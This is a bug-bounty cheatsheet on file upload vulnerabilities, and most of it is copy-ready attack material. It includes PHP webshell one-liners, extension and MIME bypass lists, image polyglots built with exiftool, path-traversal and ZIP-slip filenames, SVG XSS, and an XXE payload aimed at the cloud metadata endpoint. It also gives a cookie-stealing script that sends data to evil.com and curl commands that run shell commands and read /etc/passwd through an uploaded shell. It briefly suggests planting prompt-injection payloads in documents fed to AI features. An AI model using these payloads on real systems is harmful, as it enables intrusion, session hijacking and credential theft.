---
tags: [bugbounty, vuln/file-upload, cheatsheet, p1, p2]
aliases: [Arbitrary File Upload, File Upload Vulnerability, Unrestricted File Upload]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# File Upload Vulnerabilities

> [!tldr] Hunter Summary
> **What:** Upload malicious files — webshells, SVG-XSS, HTML injection, path traversal in filenames.
> **Impact:** RCE (P1), stored XSS (P2), SSRF via SVG, path traversal.
> **Best targets:** Profile photo, document uploads, avatar, attachment, import functionality.
> **Time to triage:** Upload test.php and request it — 5 min. Escalate based on MIME check quality.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| Profile/avatar upload | Any image upload field |
| Document import | CSV, Excel, XML import features |
| Attachment upload | Support tickets, comments with attachments |
| Template upload | Custom templates/themes |
| Code deployment | CI/CD upload endpoints, package upload |
| Backup restore | Backup file import functionality |

---

## Step-by-Step Hunt

### Step 1 — Find upload endpoints
```bash
# Crawl and look for upload forms
katana -u https://target.com -jc | grep -E "upload|file|attach|import|avatar"
```

### Step 2 — Map the validation
Upload these test files and observe responses:
- `test.php` — checks for server-side language extension block
- `test.PHP` — case sensitivity check
- `test.php.jpg` — double extension check
- `test.jpg` with PHP content — MIME-only check (bypass: polyglot)

### Step 3 — Extension bypass
```
# Double extension
shell.php.jpg
shell.php5.jpg
shell.php%00.jpg   (null byte)
shell.asp;.jpg
shell.phtml
shell.pHp
shell.Php5
shell.pHp5

# Alternative PHP extensions (often not blocked)
.php3  .php4  .php5  .php7  .phtml  .phtm
.shtml  .shtm  .phar  .cgi  .pl  .py

# ASP/ASPX
.asp  .aspx  .asa  .asax  .ashx  .asmx  .axd

# JSP
.jsp  .jspx  .jsw  .jsv  .jspf
```

### Step 4 — MIME type bypass
Change `Content-Type` in the upload request:
```
Content-Type: image/jpeg  (for .php file)
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

### Step 5 — Magic byte / polyglot
```bash
# Prepend GIF header to PHP shell
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.gif.php

# Or use exiftool to embed in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# Then rename to image.jpg.php or upload as is if server executes metadata

# JPEG polyglot
# Use https://github.com/s0md3v/PolyGlot
```

### Step 6 — Path traversal in filename
```
# Upload with traversal in filename (multipart form-data)
Content-Disposition: form-data; name="file"; filename="../shell.php"
Content-Disposition: form-data; name="file"; filename="..%2Fshell.php"
Content-Disposition: form-data; name="file"; filename="....//shell.php"

# ZIP slip — upload zip with internal path traversal
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip exploit.zip shell.php  
# But manipulate the zip entry path to: ../../shell.php
```

### Step 7 — SVG XSS / SSRF
```xml
<!-- SVG XSS -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(document.domain)</script>
</svg>

<!-- SVG SSRF (external entity reference) -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
  <image xlink:href="&xxe;" x="200" y="200" height="200" width="200"></image>
</svg>
```

### Step 8 — HTML file upload (stored XSS)
```html
<!-- Upload as .html or .htm -->
<!DOCTYPE html>
<html>
<body>
<script>document.location='https://evil.com/?c='+document.cookie</script>
</body>
</html>
```

### Step 9 — Verify execution
After upload, request the file:
```bash
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/uploads/shell.php?cmd=whoami"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
```

---

## Payload Quick Ref

```bash
# PHP webshell (minimal)
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo shell_exec($_GET['e']); ?>

# PHP one-liner upload
curl -X POST https://target.com/upload -F "file=@shell.php;type=image/jpeg"

# GIF polyglot
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# exiftool embed
exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg -o shell.jpg.php

# SVG XSS
<svg onload="alert(document.domain)"/>
```

---

## 2025-2026 Updates

> [!info] New file upload surface (2025-2026)
> - **AI document upload:** RAG/LLM features that accept PDF/DOCX — embed prompt injection payloads; also test for SSRF via document external references
> - **ZIP/tar extraction (ZIP slip):** Many modern apps still vulnerable; Python `zipfile.extractall()` without sanitization
> - **phar:// deserialization:** PHP file operations on uploaded phar files trigger unserialize()
> - **HEIC/AVIF processing:** New image formats processed by less-tested libraries — CVEs in libheif, libavif
> - **Video upload + SSRF:** ffmpeg video processing fetches external URLs from HLS playlists embedded in video files

---

## Chain Ideas

| File Upload → | Result |
|---------------|--------|
| PHP shell upload | → RCE |
| SVG XSS | → Stored XSS → ATO |
| HTML upload on CDN | → Stored XSS |
| Path traversal filename | → Overwrite config files → RCE |
| XML/SVG SSRF | → Cloud metadata → credential theft |
| ZIP slip | → Write webshell → RCE |

---

## Tools

| Tool | Use |
|------|-----|
| Burp Suite | Intercept and modify upload requests |
| `exiftool` | Embed payloads in image metadata |
| `weevely` | PHP webshell generator + client |
| `upload-scanner` | Burp extension for automated upload testing |
| `evilarc` | Create zip files with path traversal entries |

---

## References

- PortSwigger File Upload Vulnerabilities — https://portswigger.net/web-security/file-upload
- PayloadsAllTheThings Upload — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- HackTricks File Upload — https://book.hacktricks.xyz/pentesting-web/file-upload
